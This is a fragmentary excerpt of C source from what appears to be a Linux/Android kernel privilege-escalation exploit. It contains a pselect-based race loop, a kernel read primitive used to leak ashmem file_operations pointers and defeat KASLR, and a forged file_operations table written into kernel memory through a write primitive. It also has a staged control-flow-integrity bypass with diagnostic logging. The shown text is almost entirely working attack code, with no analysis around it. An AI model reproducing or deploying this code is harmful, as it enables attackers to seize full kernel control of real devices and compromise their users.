...
#else
#define PSELECT_CFI_ROUTE_ATTEMPTS 48
#endif
#endif
#ifndef PSELECT_FAST_REFRESH_INTERVAL
#define PSELECT_FAST_REFRESH_INTERVAL 3
#endif
...
static uint64_t load_u64(const unsigned char *p, size_t off) {
  uint64_t value;
  memcpy(&value, p + off, sizeof(value));
  return value;
}

static void dup_selected_fdset_fds(
    const fd_set *in, const fd_set *out, const fd_set *ex, int source_fd) {
  const unsigned long *in_bits = (const unsigned long *)in;
  const unsigned long *out_bits = (const unsigned long *)out;
  const unsigned long *ex_bits = (const unsigned long *)ex;
  int bits_per_word = (int)(8 * sizeof(unsigned long));
  int words_per_set = (PSELECT_ROUTE_NFDS + bits_per_word - 1) / bits_per_word;

  for (int word = 0; word < words_per_set; word++) {
    unsigned long bits = in_bits[word] | out_bits[word] | ex_bits[word];
    int base_fd = word * bits_per_word;
    if (base_fd + bits_per_word > PSELECT_ROUTE_NFDS) {
      int valid = PSELECT_ROUTE_NFDS - base_fd;
      if (valid <= 0) {
        break;
      }
      bits &= (1UL << valid) - 1UL;
...
void open_selected_fds(
  ...
  dup_selected_fdset_fds(in, out, ex, high_write);
  close(high_write);
...
void do_pselect_fake_lock_route(void) {
  ...
  int route_attempts_done = 0;
  for (int route_attempt = 1; route_attempt <= PSELECT_CFI_ROUTE_ATTEMPTS;
       route_attempt++) {
    route_attempts_done = route_attempt;
#ifdef FAST_MODE
    int refresh_page = route_attempt != 1 &&
                       (route_attempt % PSELECT_FAST_REFRESH_INTERVAL) == 1;
#else
    int refresh_page = route_attempt != 1;
#endif
    if (refresh_page) {
  ...
  struct timespec end;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &end));
  long elapsed_ms = (end.tv_sec - start.tv_sec) * 1000L +
                    (end.tv_nsec - start.tv_nsec) / 1000000L;
  pr_info("pselect route elapsed_ms=%ld attempts=%d/%d verified=%d\n",
          elapsed_ms, route_attempts_done, PSELECT_CFI_ROUTE_ATTEMPTS,
          route_verified);
...
int refresh_fake_fops_text(int fd) {
  unsigned char table[FOPS_SHOW_FDINFO_OFF + sizeof(uint64_t) -
                      FOPS_READ_ITER_OFF];
  memset(table, 0, sizeof(table));
  put64(table, FOPS_READ_ITER_OFF - FOPS_READ_ITER_OFF,
        text_addr(CONFIGFS_READ_ITER));
  put64(table, FOPS_WRITE_ITER_OFF - FOPS_READ_ITER_OFF,
        text_addr(CONFIGFS_BIN_WRITE_ITER));
  put64(table, FOPS_IOCTL_OFF - FOPS_READ_ITER_OFF, text_addr(ASHMEM_IOCTL));
  put64(table, FOPS_COMPAT_IOCTL_OFF - FOPS_READ_ITER_OFF,
        text_addr(ASHMEM_COMPAT_IOCTL));
  put64(table, FOPS_MMAP_OFF - FOPS_READ_ITER_OFF, text_addr(ASHMEM_MMAP));
  put64(table, FOPS_OPEN_OFF - FOPS_READ_ITER_OFF, text_addr(ASHMEM_OPEN));
  put64(table, FOPS_RELEASE_OFF - FOPS_READ_ITER_OFF,
        text_addr(ASHMEM_RELEASE));
  put64(table, FOPS_SPLICE_READ_OFF - FOPS_READ_ITER_OFF,
        text_addr(COPY_SPLICE_READ));
  put64(table, FOPS_SHOW_FDINFO_OFF - FOPS_READ_ITER_OFF,
        text_addr(ASHMEM_SHOW_FDINFO));

  return kernel_write_data(fd, fake_fops + FOPS_READ_ITER_OFF, table,
                           sizeof(table)) == (ssize_t)sizeof(table);
}

int leak_kernel_base(int fd) {
  kaslr_fops_alias = p0_data_alias(ASHMEM_FOPS);
  unsigned char fops[FOPS_SHOW_FDINFO_OFF + sizeof(uint64_t) -
                     FOPS_IOCTL_OFF];
  if (kernel_read_data(fd, kaslr_fops_alias + FOPS_IOCTL_OFF, fops,
                       sizeof(fops)) != (ssize_t)sizeof(fops)) {
    kaslr_step = 1;
    return 0;
  }
  kaslr_open_ptr = load_u64(fops, FOPS_OPEN_OFF - FOPS_IOCTL_OFF);
  kaslr_ioctl_ptr = load_u64(fops, FOPS_IOCTL_OFF - FOPS_IOCTL_OFF);
  kaslr_mmap_ptr = load_u64(fops, FOPS_MMAP_OFF - FOPS_IOCTL_OFF);
  kaslr_release_ptr = load_u64(fops, FOPS_RELEASE_OFF - FOPS_IOCTL_OFF);
  kaslr_show_fdinfo_ptr =
    load_u64(fops, FOPS_SHOW_FDINFO_OFF - FOPS_IOCTL_OFF);
...
int try_cfi_stage(void) {
  ...
  int pre_errno = errno;
  pr_info("cfi fops_precheck ret=%zd value=%016llx want=%016zx "
          "misc=%016zx errno=%d\n",
  ...
  int rb_errno = errno;
  fops_before = before;
  pr_info("cfi fops_postcheck ret=%zd value=%016llx want=%016zx "
          "misc=%016zx errno=%d\n",
          rb, (unsigned long long)before, fake_fops, misc_fops, rb_errno);
  if (rb != (ssize_t)sizeof(before) || before != fake_fops) {
    cfi_last_step = 4;
    cfi_last_errno = rb_errno;
    goto fail;
  }
